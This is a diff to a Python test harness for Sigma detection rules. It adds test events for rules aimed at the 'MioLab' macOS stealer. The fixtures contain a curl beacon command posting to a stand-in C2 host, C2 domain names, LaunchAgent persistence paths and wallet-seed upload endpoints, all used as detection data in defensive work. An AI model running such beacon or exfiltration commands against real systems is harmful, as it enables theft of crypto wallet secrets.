@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """Logic test for the Sigma rules in ../sigma on hand-made events (no real logs, no regression EVTX).
 A tiny evaluator supports exactly the modifiers/conditions these rules use: exact, startswith, endswith,
-contains, 'sel', 'not', 'and', 'or', '1 of sel_*'. Needs PyYAML."""
+contains, contains|all, 'sel', 'not', 'and', 'or', '1 of sel_*'. Needs PyYAML."""
 import glob, os, re, sys
 import yaml
 
@@ -21,8 +21,10 @@ FN = {'': lambda a, b: a == b, 'startswith': str.startswith, 'endswith': str.end
 def sel(s, ev):
     for k, v in s.items():
         f, _, mod = k.partition('|')
+        mod, _, quant = mod.partition('|')
         val = str(ev.get(f, '')).lower()
-        if not any(FN[mod](val, str(x).lower()) for x in (v if isinstance(v, list) else [v])):
+        hits = [FN[mod](val, str(x).lower()) for x in (v if isinstance(v, list) else [v])]
+        if not (all(hits) if quant == 'all' else any(hits)):
             return False
     return True
 
@@ -64,6 +66,23 @@ T = [
     ('image_load_win_susp_unsigned_version_dll_user_path.yml', dict(ImageLoaded='C:\\Windows\\System32\\version.dll', Signed='true'), False, 'System32 copy'),
     ('image_load_win_susp_unsigned_version_dll_user_path.yml', dict(ImageLoaded='C:\\Users\\a\\Downloads\\x\\version.dll', Signed='true'), False, 'signed vendor copy'),
     ('image_load_win_susp_unsigned_version_dll_user_path.yml', dict(ImageLoaded='C:\\Program Files\\Game\\version.dll', Signed='false'), False, 'documented miss: unsigned proxy in Program Files'),
+    # MioLab macOS rules
+    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/Users/a/.hlpr/.agnt', ParentImage='/sbin/launchd', CommandLine='/Users/a/.hlpr/.agnt'), True, 'agent binary runs'),
+    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/bin/zsh', ParentImage='/Users/a/.hlpr/.agnt', CommandLine='/bin/zsh -i'), True, 'child of the agent'),
+    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/usr/bin/curl', ParentImage='/bin/sh', CommandLine='curl --fail --header "Content-Type: text/plain" --data "OOzVBOVSpQSP" https://c2.example/api/agnt'), True, 'beacon command line'),
+    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/usr/bin/curl', ParentImage='/bin/zsh', CommandLine='curl --fail --header "Content-Type: text/plain" --data "hello" https://example.com/api/other'), False, 'ordinary curl POST'),
+    ('proc_creation_macos_malware_miolab_agent_activity.yml', dict(Image='/Applications/App.app/Contents/MacOS/App', ParentImage='/sbin/launchd', CommandLine='App'), False, 'unrelated process'),
+    ('file_event_macos_malware_miolab_persistence_indicators.yml', dict(TargetFilename='/Users/a/Library/LaunchAgents/com.hlpr.agent.plist'), True, 'LaunchAgent plist'),
+    ('file_event_macos_malware_miolab_persistence_indicators.yml', dict(TargetFilename='/Users/a/.hlpr/.ownrid'), True, 'staging file'),
+    ('file_event_macos_malware_miolab_persistence_indicators.yml', dict(TargetFilename='/Users/a/Library/LaunchAgents/com.example.helper.plist'), False, 'other LaunchAgent'),
+    ('net_dns_miolab_stealer_c2_domains.yml', dict(query='dfsjfisafosdikfos.info'), True, 'C2 apex'),
+    ('net_dns_miolab_stealer_c2_domains.yml', dict(query='api.owqkoqoqoqoqoqqoqoo.info'), True, 'exfil subdomain'),
+    ('net_dns_miolab_stealer_c2_domains.yml', dict(query='example.info'), False, 'unrelated domain'),
+    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'GET', 'c-uri': '/api/download/app-bundle?name=ledger-wallet&user_id=124&arch=arm64'}, True, 'wallet bundle download'),
+    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'POST', 'c-uri': '/api/agnt'}, True, 'agent beacon'),
+    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'POST', 'c-uri': '/api/trezor/seed'}, True, 'seed upload'),
+    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'GET', 'c-uri': '/api/agnt'}, False, 'GET to /api/agnt'),
+    ('proxy_malware_miolab_c2_communication.yml', {'cs-method': 'GET', 'c-uri': '/api/download/app-bundle'}, False, 'download path without parameters'),
 ]
 for f, ev, exp, label in T:
     check(fires(load(f), ev) == exp, f'{f.split("_malware_")[-1] if "_malware_" in f else f}: {label} -> {"fire" if exp else "silent"}')
